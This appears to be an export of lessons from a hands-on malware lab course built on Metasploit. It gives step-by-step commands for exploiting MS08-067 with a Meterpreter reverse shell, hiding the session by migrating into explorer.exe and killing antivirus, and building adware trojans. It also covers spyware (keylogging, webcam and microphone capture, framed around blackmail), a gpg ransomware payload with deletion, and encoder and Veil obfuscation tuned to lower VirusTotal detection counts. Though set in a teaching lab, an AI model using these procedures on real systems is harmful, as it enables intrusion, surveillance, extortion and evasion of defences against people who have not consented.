<p style=""text-align: justify;""><font size=""+1"">Therefore, to evaluate how a worm works, the tutorial is based on the exploits used for a famous worm called ""Conficker"". This malware infected more than 1.5 million IP addresses from 206 countries in its first version and later versions had a major impact. But, why was it such a harmful and uncontrollable malware?</p>
<p style=""text-align: justify;""><font size=""+1"">As we know, worms propagate themselves. Conficker was propagated as a DLL (Dynamically linked library) which runs as part of svchost.exe, for this reason, anti-viruses did not have a response against it. The propagation was exploited by a windows vulnerability known as MS08-067 (qualified as Critical by Microsoft Security Techcenter). The vulnerability is due to a bug in the random number generator of the scan port routine, using SMB (Server Message Block) Conficker was able to infect other devices. Besides, a later version copies itself as the autorun.inf in USB drives to broaden the range of infections. For this example, MSF has this vulnerability as an exploit module executed as follows:</p>
<p>In the Metasploit console,</p>
<ol>
<li>Search for the exploit: <em>'search ms08_067'</em>.</li>
<li>Set the right option with the vulnerability:</li>
</ol>
<p style=""text-align: center;""><font size=""+1""><em>'use exploit/windows/</em>smb<em>/ms08_067_netapi '</em></p>
<ol start=""3"">
<li>Configure the options (to identify it, use <em>&lsquo;show options&rsquo;</em>), for this case only RHOST(windows):</li>
</ol>
<p style=""text-align: center;""><font size=""+1""><em>'set RHOST <span style=""color: #ff0000;"">IP_remote_host</span>'</em></p>
<ol start=""4"">
<li>Now, you should choose a payload. In this specific example Meterpreter is used:</li>
</ol>
<p style=""text-align: center;""><font size=""+1""><em>'set payload windows/meterpreter/reverse_tc' </em></p>
<ol start=""5"">
<li>Set the payload, for meterpreter LHOST(lubuntu):</li>
</ol>
<p style=""text-align: center;""><font size=""+1""><em>'set LHOST <span style=""color: #ff0000;"">IP_local_host</span>'</em></p>
<ol start=""6"">
<li>Finally, to exploit the MS08_067 vulnerability, run the exploit:</li>
</ol>
<p style=""text-align: justify;""><font size=""+1"">You will only see the meterpreter console, in case the exploit was successfully completed on the target machine. Run &lsquo;ls&rsquo; to list the files on the windows VM. The figure below illustrates this fact.</p><p style=""text-align: center;""><span style=""font-size: xx-small;""><img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/wormSuccess.png"" alt=""MS08_067 exploited successfully."" width=""70%"" /> MS08_067 exploited successfully.</span></p><h3>Challenge: </h3>Try to exploit the Metasploitable VM(Linux) as above, simulating a worm.</h3>
<p><strong>Hint:</strong> use samba/usermap vulnerability.</p>"
5,Creating Malware:Advanced,1,Rootkit,yes,Activity Rootkit,assets/pdf/5-MalwareAdvanced.pdf,,"<p style=""text-align: justify;"">><font size=""+1"">The concealment of a harmful malware is the target of a rootkit malware; therefore, it involves that a legitimate user should not realize that someone else is controlling his device.</p>
<p style=""text-align: justify;""><font size=""+1"">Once access is completely granted, you can list all processes using the command <em>'ps'</em>. Your session should be active but the user can check it and take measures. Hiding the malware process is extremely simple, you should migrate it to another process. To do so, run the command <em>'migrate'</em> plus the destination PID process.</p>
<p style=""text-align: justify;""><font size=""+1"">The best solution is to migrate towards <em>'explorer.exe'</em> since in this way you avoid the connection drop and it makes the machine always available for access unless it is off. Furthermore, meterpreter provides extra functions as kill process (For example, to kill antivirus.exe).</p>

<p style=""text-align: center;""><span style=""font-size: xx-small;""><img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/RootKitSuccess.PNG"" alt=""Hiding the process from the user."" width=""80%"" /> Hiding the process from the user.</span></p>"
5,Creating Malware:Advanced,2,Adware,yes,Activity Adware,assets/pdf/5-MalwareAdvanced.pdf,,"<p style=""text-align: justify;""><font size=""+1"">The adware creation is based on sending some information without user assent. Adware works as a virus, trojan or botnet; therefore, the example below builds an exe file for this purpose. The payload used in this exercise is windows/messagebox, but it is combined a few times to present several ads.</p>
<p style=""text-align: justify;""><font size=""+1"">First, the initial ad-message needs to be created, using msfvenom write the following sentence:</p>
<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/adware1.png"" 
alt=""First message to be presented."" width=""80%"" /> 
First message to be presented.</span></p><p style=""text-align: justify;""><font size=""+1"">The command gives as result a 'raw' payload saved as a file called ad1. The next step is adding a new message. In order to use two or more payloads at the same time, you should use the option <em>'-c'</em> that allows this action. The figure below shows the procedure of adding three ads.</p>
<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/adware2.png"" 
alt=""Combining various payloads."" width=""80%"" /> 
Combining various payloads.</span></p><p style=""text-align: justify;""><font size=""+1"">Once added the number of messages required, the malware should be created as a trojan in a similar way to lesson 4.1.</p>

<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/adware3.png"" 
alt=""Final line to create a trojan adware."" width=""100%"" /> 
Final line to create a trojan adware.</span></p><p style=""text-align: justify;""><font size=""+1"">Finally, once the trojan is ready, copy it to the shared folder and run it in Windows VM. You should see something like this:</p>

<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/adwareSuccess.png"" 
alt=""Adware running successfully."" width=""80%"" /> 
Adware running successfully.</span></p>"
5,Creating Malware:Advanced,3,Spyware,yes,Activity Spyware,assets/pdf/5-MalwareAdvanced.pdf,,"<p style=""text-align: justify;""><font size=""+1"">Being Spyware one of the most dangerous kinds of malware, Metasploit provides a few options to take advantage of it. The laboratory presents four ways of spy a target device, however, these are not always properly operating due to factors such as drivers, non-generic hardware, etc.</p>
<p style=""text-align: justify;""><font size=""+1"">Before starting to spy, you should gain access to the victim's device. You can use the exploit used for the demonstration in lesson 4.3. Once done, you can start running the spywares as follows:</p>
<p style=""text-align: justify;""><font size=""+1""><strong>Screenshot</strong></p>
<p style=""text-align: justify;""><font size=""+1"">If you are interested in knowing what the genuine user is doing, you should use this command.&nbsp; In meterpreter console, run: '<em>screenshot'</em> as in the image below.</p>
<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/spyware1.png"" 
alt=""Screenshot took from victim's machine."" width=""100%"" /> 
Screenshot took from victim's machine.</span></p><p style=""text-align: justify;""><font size=""+1""><strong>Keylogger</strong></p>
<p style=""text-align: justify;""><font size=""+1"">The peripheral input is the main source of personal information from a device, hence, a spyware will focus on getting all this info. MSF is equipped with a keylogger in meterpreter. You can use the keylogger following the next steps:</p>
<ol>
<li>Get access to meterpreter</li>
<li>To start keylogger, write 'keyscan_start'.</li>
<li>Meterpreter will record every key pressed. Wait the necessary time.</li>
<li>To obtain the keylogger record, type 'keyscan_dump'. This will show you the content.</li>
<li>Finally, to end the process write 'keyscan_stop'.</li>
</ol>
<p style=""text-align: justify;""><font size=""+1""><strong>Webcam remotely</strong></p>
<p style=""text-align: justify;""><font size=""+1"">Malware developers aim to blackmail their victims using shameful or incriminatory material. To do so, a webcam can be used to spy in meterpreter console. Various commands are available and their use is similar to the previous exercises. The key ones are presented below:</p>
<ul>
<li><em>Meterpreter-&gt; webcam_list:</em> Show all webcam devices available.</li>
<li><em>Meterpreter-&gt; webcam_snap</em>: Takes a snapshot from webcam.</li>
<li><em>Meterpreter-&gt; run webcam -p File_path:</em> Start recording video.</li>
</ul>
<p style=""text-align: justify;""><font size=""+1""><strong>Microphone remotely</strong></p>
<p style=""text-align: justify;""><font size=""+1"">The same principle as for webcams, sound records can be used for blackmailing. This can be executed as follows:</p>
<ul>
<li><em>Meterpreter-&gt; run sound_recorder -h:</em> This will record for 30 seconds only.</li>
<li><em>Meterpreter-&gt; run sound_recorder -i TIME_INTERVAL:</em> This option gives the number of intervals for 30 seconds, for example '-i 6' is 3 minutes (30seconds x 6= 3 minutes).</li>
</ul>
<p style=""text-align: justify;""><font size=""+1""><em>Meterpreter-&gt; run sound_recorder -l File_path:</em> This saves the record in a specific directory.</p>
"
5,Creating Malware:Advanced,4,Ransomware,yes,Activity Ransomware,assets/pdf/5-MalwareAdvanced.pdf,,"<p style=""text-align: justify;""><font size=""+1"">In this example, a simulation of a ransomware encrypts a destination folder(or files). Furthermore, this can be permanently deleted and can only be recovered with the proper key. The payload in use is for Linux, search for '<em>ransomware'</em> and look the info in msfconsole. As you can see, this is a Linux payload, therefore, it can be used on the host machine.</p>
<p style=""text-align: justify;""><font size=""+1"">In msfconsole, use the payload and look for the options. For testing, set PATH with a folder including some files inside (e.g., Downloads), set a PASSPHRASE, and a NAME for the encrypted output file. To conclude, generate the malware. In the case of Linux, it should be a shell script file, thus you can run it. The figure below shows the malware creation:</p>

<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/ransomware1.png"" 
alt=""Creating a ransomware running as bash shell."" width=""90%"" /> 
Creating a ransomware running as bash shell.</span></p><p style=""text-align: justify;""><font size=""+1"">To run the malware, first, you should give execution privileges to the script and then run it as a common program. Once run, you should have an encrypted file (ransomware.rsn by default).</p>

<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/ransomware2.png"" 
alt=""Executing ransomware."" width=""100%"" /> 
Executing ransomware.</span></p><p style=""text-align: justify;""><font size=""+1"">In order to decrypt the file, you should use &lsquo;gpg&rsquo; as follows:</p>
<p style=""text-align: center;""><em>'gpg </em><em>&ndash;</em><em>decrypt <span style=""color: #ff0000;"">FILE_NAME</span>&gt;<span style=""color: #ff0000;""> new_name.tar</span>'</em></p>
<p style=""text-align: justify;""><font size=""+1"">The image below shows the favourable decryption; therefore, the files were recovered.</p>

<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/ransomware3.png"" 
alt=""Proof of correct decryption."" width=""90%"" /> 
Proof of correct decryption.</span></p>
<p style=""text-align: justify;""><font size=""+1""><em>Note: Feel free to explore this payload, using option DELETE and combining with another payload such as messageBox.</em></p>"
6,Evasion and obfuscation,1,"Malware analysis, virus total and others",yes,"Activity Malware analysis, virus total and others",assets/pdf/6-Evasion and obfuscation.pdf,,"<p style=""text-align: justify;""><font size=""+1"">Before starting obfuscation techniques, it is necessary to know what the new malware should evade. There is a variety of tools that can analyse suspicious files looking for a payload signature in order to detect malicious software. This lab presents two online tools which fit our needs:</p>
<p style=""text-align: justify;""><font size=""+1""><strong>VirusTotal</strong></p>
<p style=""text-align: justify;""><font size=""+1"">This is a very popular anti-malware tool based on signature analysis; the site uses the most common antiviruses to evaluate a file uploaded.&nbsp; After a few seconds, you will get a report with the information found. The result data consist in:</p>
<ul>
<li>The amount and name of the antiviruses engines that detected a malware.</li>
<li>If it was detected, the name and code of payload.</li>
<li>The malware behaviour.</li>
<li>Details such as Hash value, filename, file type and more.</li>
</ul>
<p style=""text-align: justify;""><font size=""+1"">The main feature is the number of antiviruses that detected a malware since this lesson is interested in evading most of them. To start with the exercise, take any file previously created in this lab and upload to the site: <a href=""https://www.virustotal.com"">VirusTotal</a>. The figure below shows results of the payload used in lesson 4.1; indeed, it was detected by 52/63 anti-malware tools.</p>

<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/virusTotal1.png"" 
alt=""Results of a trojan analysed by VirusTotal."" width=""90%"" /> 
Results of a trojan analysed by VirusTotal. Available <a href=""https://www.virustotal.com/#/file/6085c656afc73f0aa672de1fbf43e4f9ecf367f9237c47cd22ecb5411e6a40f0/detection"">here</a></span></p><p style=""text-align: justify;""><font size=""+1""><strong>Payload Security</strong></p>
<p style=""text-align: justify;""><font size=""+1"">The second mechanism performs a hybrid analysis. Both analysis approaches are completed, not only the signature-based (static), but also an execution emulation (dynamic). The problem of this tool is the extended duration of the analysis time. You can register an email to be notified once the report is ready. Despite the timing constraints, the results are remarkable because it gives a complete report including:</p>
<ul>
<li>Malicious and suspicious indicators.</li>
<li>Threat score.</li>
<li>Operating system behaviour.</li>
<li>Screenshots of the execution.</li>
<li>VirusTotal report</li>
<li>Network analysis and more.</li>
</ul>
<p style=""text-align: justify;""><font size=""+1"">You can check your own malware in <a href=""https://www.hybrid-analysis.com"">Payload Security</a>. The image below shows a part of the report of the trojan payload developed in lesson 3.3.</p>

<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/payloadSecurity.png"" 
alt=""Results of a trojan analysed by Payload Security."" width=""90%"" /> 
Results of a trojan analysed by Payload Security. Available <a href=""https://www.hybrid-analysis.com/sample/b474dccc1a79da7837b783e8044b74b84bb4a276d65a50e8c48523b934828b70?environmentId=100"">here</a>.</span></p>
"
6,Evasion and obfuscation,2,Encoders: Basic,yes,Activity Encoders: Basic,assets/pdf/6-Evasion and obfuscation.pdf,,"<p style=""text-align: justify;""><font size=""+1"">Encoders in Metasploit are available in msfvenom and msfconsole. Before starting with the exercise, look of the encoders available. Write on the terminal &lsquo;msfvenom -l encoders&rsquo; or in msfconsole &lsquo;show encoders&rsquo;.</p>
<p style=""text-align: justify;""><font size=""+1"">Note: Look the rank in the encoders list. It refers to the effectiveness.</p>
<p style=""text-align: justify;""><font size=""+1"">This exercise is based on the payload used in lesson 4.1, as the image above shows 52/63 antiviruses found the malware. To start encoding payloads, a basic command using in msfvenom is the option &lsquo;-e&rsquo; followed by the encoder available. The complete command is:</p>
<p style=""text-align: justify;""><font size=""+1""><em>&lsquo;msfvenom -p <span style=""color: #ff0000;"">PAYLOAD</span> -e <span style=""color: #ff0000;"">ENCODER</span>&rsquo;&rsquo;</em></p>
<p style=""text-align: justify;""><font size=""+1"">Another useful option for encoders is &lsquo;-<em>i</em><em>&rsquo;</em> that is the number of iterations to encode the payload. The example is shown in the figure below where an encoder called shikata_ga_nai ranked as Excellent, is used. Now, the report from VirusTotal gives 48/63, check <a href=""https://www.virustotal.com/"">here</a>.</p>

<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/encoder1.png"" 
alt=""Encoding payload to evade more antiviruses."" width=""100%"" /> 
Encoding payload to evade more antiviruses.</span></p>
"
6,Evasion and obfuscation,3,Encoders: Advanced,yes,Activity Encoders: Advanced,assets/pdf/6-Evasion and obfuscation.pdf,,"<p style=""text-align: justify;""><font size=""+1"">The simple encoder presented has enhanced the obfuscation, but this is still insufficient. For this reason, three extra options of Metasploit are presented in this tutorial:</p>
<p style=""text-align: justify;""><font size=""+1""><strong>Avoiding bad characters</strong></p>
<p style=""text-align: justify;""><font size=""+1"">Instead of using a specific encoder, you can use the flag &lsquo;-b&rsquo; which avoids certain characters in the payload, for example &lsquo;/x00&rsquo;. When the option is set, Metasploit will use an encoder automatically to change the bad character.</p>
<p style=""text-align: center;""><em>&lsquo;Msfvenom -p <span style=""color: #ff0000;"">PAYLOAD</span> -b &lsquo;\x00&rsquo; &lsquo;</em></p>
<p style=""text-align: justify;""><font size=""+1""><strong>Multiple encoders</strong></p>
<p style=""text-align: justify;""><font size=""+1"">Perhaps only one encoder is not enough, but, if several encoders are combined for one malware, it could be a better solution. This approach mixes the raw output before creating a file and separating them with &lsquo;|&rsquo;, the following figure illustrates this process:</p>

<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/encoder2.png"" 
alt=""Multiple encoders for a payload."" width=""90%"" /> 
Multiple encoders for a payload.</span></p>
<p style=""text-align: justify;""><font size=""+1""><em>Note: You must specify the architecture (flag '-a') and platform (flag '--platform') when you use a raw payload.</em></p>
<p style=""text-align: justify;""><font size=""+1""><strong>Using a template</strong></p>
<p style=""text-align: justify;""><font size=""+1"">Finally, one of the best obfuscation techniques is using a template file to hide the malicious software code. This method was already used in lesson 4.1, in msfvenom, the option &lsquo;-x&rsquo; combine the payload with a custom template (e.g. 7zip.exe in this case)</p>
<p style=""text-align: justify;""><font size=""+1""><strong>All combined</strong></p>
<p style=""text-align: justify;""><font size=""+1"">In this project, the best solution found is to combine all methods in one command line. The sentence contains two encoders (shikata_ga_nai and countdown), bad characters (/x00) and an exe template (7zip.exe) as shown below.</p>

<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/encoder3.png"" 
alt=""Combined command line. Red underline using encoders, yellow underline avoiding bad characters and green underline supplying a template."" width=""90%"" /> 
Combined command line. Red underline using encoders, yellow underline avoiding bad characters and green underline supplying a template.</span></p>
<p style=""text-align: justify;""><font size=""+1"">The result of the final malware version is considerably better, VirusTotal gives only 28/64 antiviruses, hence, this version evaded 24 more antiviruses that the first one presented in 6.1. The figure below demonstrates this point, or check <a href=""https://www.virustotal.com/#/file/509c5cb33563c367e3c3552028dbe0de176212b6fded4be2f23e5b919ebd499c/detection"">here</a>.</p>

<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/virusTotal2.png"" 
alt=""VirusTotal reported fewer detections."" width=""90%"" /> 
VirusTotal reported fewer detections. <a href=""https://www.virustotal.com/#/file/509c5cb33563c367e3c3552028dbe0de176212b6fded4be2f23e5b919ebd499c/detection"">Report available here.</a></span></p>
<p style=""text-align: justify;""><font size=""+1""><strong>Challenge</strong>: Experiment with the encoder tools and try to evade more anti-malware software.</p>"
6,Evasion and obfuscation,4,Veil- Framework,yes,Activity Veil- Framework,assets/pdf/6-Evasion and obfuscation.pdf,,"<p style=""text-align: justify;""><font size=""+1"">This framework is a collection of tools developed in Python and is used to generate payloads with a low likelihood of detection. The main tool is a Veil-evasion presented in this exercise. The example develops a bind shell as previously developed and then the output will be compared to other detection reports. There are two ways of using this framework, one is a type of console (like msfconsole) and another is a command line. The command line is used for the tutorial, however, both methods are valid such as Metasploit.</p>
<p style=""text-align: justify;""><font size=""+1"">The framework is installed in /home/lab/Download/Veil-master, therefore you must use this path for running it. To start, go to the folder &lsquo;cp /home/lab/Download/Veil-master&rsquo; and run &lsquo;./Veil.py&rsquo;. You should see the console screen. Write exit or you can experiment with it for a moment.</p>
<p style=""text-align: justify;""><font size=""+1"">To know which payloads are available, you should use './Veil.py -t Evasion --list-payloads'&nbsp;&nbsp; where -t specifies the tool required. The figure below shows part of the list:</p>
<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/veil1.png"" 
alt=""Some payloads available in Veil."" width=""90%"" /> 
Some payloads available in Veil.</span></p>
<p style=""text-align: justify;""><font size=""+1"">To develop a payload, you should select the following flags (to see all: &lsquo;./Veil &ndash;&rsquo;):</p>
<ul>
<li><strong>-t:</strong> Select the tool (Evasion or ordnance).</li>
<li><strong>-p:</strong> Select one payload from the list by number.</li>
<li><strong>--msfvenom:</strong> Use a specific payload from msfvenom.</li>
<li><strong>--</strong>ip<strong>:</strong> Ip address used for the payload.</li>
<li><strong>--port</strong>: Port that used for the payload.</li>
<li><strong>--compiler:</strong> Options for the format.</li>
<li><strong>-o:</strong> Output name for the file.</li>
</ul>
<p style=""text-align: justify;""><font size=""+1"">Once knowing these options, the malware is created with the following command:</p>

<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/veil2.png"" 
alt=""Creating a bind shell with Veil-Evasion."" width=""90%"" /> 
Creating a bind shell with Veil-Evasion.</span></p><p style=""text-align: justify;""><font size=""+1"">To conclude, this new malware was analysed in VirusTotal. The report gives only 2/63 detections, that is to say, the best result of this tutorial. The image below illustrates it.</p>

<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/virusTotal3.png"" 
alt=""Results for malware developed in Veil-Framework."" width=""90%"" /> 
Results for malware developed in Veil-Framework. <a href=""https://www.virustotal.com/#/file/8a6ff2ff27552bb979e3ed8152d95b45e32b4597a0542a96af51581a8c79ef6a/detection"">Report available here.</a></span></p>
"
7,Creating your own payload,1,Basic concepts,,,assets/pdf/7-Creating-own.pdf,,"<p style=""text-align: justify;""><font size=""+1"">Metasploit is written in Ruby and divided in modules. The lab focusses on the payload module divided into two big groups: Staged and single payloads. Payloads are stored in <em>/opt/Metasploit-framework/modules/payloads</em>, therefore, they are loaded when Metasploit starts up. They are classified with reference names that indicate all the pieces as follows:</p>
<ul>
<li>Single payloads: &lt;platform&gt;/[arch]/&lt;single&gt;</li>
<li>Staged payloads: &lt;platform&gt;/[arch]/&lt;stage&gt;/&lt;stager&gt;</li>
</ul>
<p style=""text-align: justify;""><font size=""+1"">Single payloads are studied in this lab, an example is <em>'windows/adduser'</em> used in lesson 3.3 and stored in <em>/opt/metasploit-framework/payloads/singles/windows/adduser.rb.</em></p>
<p style=""text-align: justify;""><font size=""+1"">To understand the code, an original payload should be analysed, the example takes 'exec' for Linux (/Linux/x86/exec.rb).&nbsp; The action is ""Execute an arbitrary command"", according to Metasploit info shown in msfconsole. Before the following lesson, open the file and try to explore it by yourself.</p>
"
7,Creating your own payload,2,Analysing how a payload is written,yes,Activity Analysing how a payload is written,assets/pdf/7-Creating-own.pdf,,"
<p style=""text-align: justify;""><font size=""+1"">This lesson interprets the payload 'exec'. The Ruby file is explained in three sections namely: head, options, and generation. The figure below illustrates these components.</p>

<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/Payload2.png"" 
alt=""Source code of payload exec.rb"" width=""90%"" /> 
Source code of payload exec.rb</span></p><p style=""text-align: justify;""><font size=""+1""><strong>Head.</strong> The module information is placed here, Metasploit reads this section and presents when needed. This head is pre-set and has a defined style.</p>
<p style=""text-align: justify;""><font size=""+1""><strong>Options.</strong> It is the list of preferences available for user&rsquo;s choice. Default values can be defined and comments can be added for each one.</p>
<p style=""text-align: justify;""><font size=""+1""><strong>Generation</strong>. It is the principal section where the code is generated. The set options are read and added to the payload. It depends on which platform and architecture the shell code is developed; this example is for Linux-x86. Therefore, to create a new function, this part should be changed and the code inserted here must be in assembler. To better understand it, you should use a disassembler tool such as IDA or an online one called<a href=""https://www.onlinedisassembler.com/odaweb/""> ODA</a>. Basically, it opens a terminal and runs a command line.</p>"
7,Creating your own payload,3,Examples: Compress and Ransomware,,,assets/pdf/7-Creating-own.pdf,,"<p style=""text-align: justify;""><font size=""+1"">Using linux/x86/exec as a template, two authentic payloads were created in the project. Both are used in Metasploit for the platform Linux and architecture x86. They are explained in the following lines.</p>
<p style=""text-align: justify;""><font size=""+1""><strong>Compress</strong></p>
<p style=""text-align: justify;""><font size=""+1"">This payload compresses a set of files or a folder in a single .tar file. The preferences are ""NAME"" as filename and ""PATH"" as a path to a folder or files to be compressed. The payload opens a terminal and runs the command 'tar -cf <span style=""color: #ff0000;"">filename</span> -P <span style=""color: #ff0000;"">path</span>'.</p>
<p style=""text-align: justify;""><font size=""+1"">To improve your understanding, test the payload and analyse the Ruby file.</p>
<p style=""text-align: justify;""><font size=""+1""><strong>Ransomware</strong></p>
<p style=""text-align: justify;""><font size=""+1"">This payload was already used and tested in lesson 5.4 Ransomware; therefore, it is not part of the Metasploit-framework. The payload works in the following way:</p>
<ol>
<li>Opens a terminal.</li>
<li>Compresses the files with the command 'tar -cf <span style=""color: #ff0000;"">filename</span> -P <span style=""color: #ff0000;"">path</span>' and jumps to the next line.</li>
<li>Using GnuPG<a href=""#_ftn1"" name=""_ftnref1"">[1]</a>, encrypts the previous output in this way:</li>
</ol>
<p style=""text-align: center;"">&rsquo;gpg --passphrase <span style=""color: #ff0000;"">PASSPHRASE</span> -o <span style=""color: #ff0000;"">OUTPUT_FILENAME</span> --symmetric<span style=""color: #ff0000;""> PATH</span>&rsquo;</p>
<ol start=""4"">
<li>Finally, if it is set, runs the delete line 'rm -rf <span style=""color: #ff0000;"">filename</span>&rsquo;</li>
</ol>
<p style=""text-align: justify;""><font size=""+1"">&nbsp;</p>
<p style=""text-align: justify;""><font size=""+1""><a href=""#_ftnref1"" name=""_ftn1"">[1]</a> GNU Privacy Guard is a free cryptographic software.</p>
"
7,Creating your own payload,4,Creating a basic: MKDIR,yes,Activity Creating a basic: MKDIR,assets/pdf/7-Creating-own.pdf,,"<p style=""text-align: justify;""><font size=""+1"">This example develops a simple payload that creates a new folder on the current path. To start, you can use <em>'exec'</em> payload as a template and add the respective action. Follow the steps below:</p>
<ol>
<li>Copy the template /opt/metasploit-framework/payloads/singles/exec.rb with a new name.</li>
<li>Open the new file, and edit the options (do not forget default values). For this case, change &lsquo;CMD&rsquo; to &lsquo;Folder_name&rsquo; or other as follows:</li>
</ol>

<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/Payload3.png"" 
alt=""Options for the new payload."" width=""90%"" /> 
Options for the new payload.</span></p><ol start=""3"">
<li>In generation section, add/change options.</li>
<li>Then, add the new command in hexadecimal. You can use an online tool for encoding it. <a href=""http://www.convertstring.com/en/EncodeDecode/HexEncode"">Click Tool</a>. <em>Note: use delimiter input </em><em>&lsquo;</em><em>\x</em><em>&rsquo;</em><em> and do not forget spaces.</em></li>
</ol>
<p style=""text-align: center;"">Example: Command &ldquo;mkdir &rdquo;, encoded command is &ldquo;\x6D\x6B\x64\x69\x72\x20&rdquo;</p>
<ol start=""5"">
<li>Finally, you must add the number of new characters. In this case 6 by &lsquo;mkdir&rsquo;.</li>
</ol><p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/Payload4.png"" 
alt=""Adding new payload instructions."" width=""90%"" /> 
Adding new payload instructions.</span></p><p style=""text-align: justify;""><font size=""+1"">Now, this is ready, let's test it! To load in msfconsole, type 'reload_all' and it will be uploaded. Notice that there is one more payload (489).</p>
<p style=""text-align: justify;""><font size=""+1"">The next figure shows how to use your new payload and its correct performance:</p>

<p style=""text-align: center;""><span style=""font-size: xx-small;"">
<img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/Payload5.png"" 
alt=""Testing a new payload for Linux."" width=""90%"" /> 
Testing a new payload for Linux.</span></p>
"
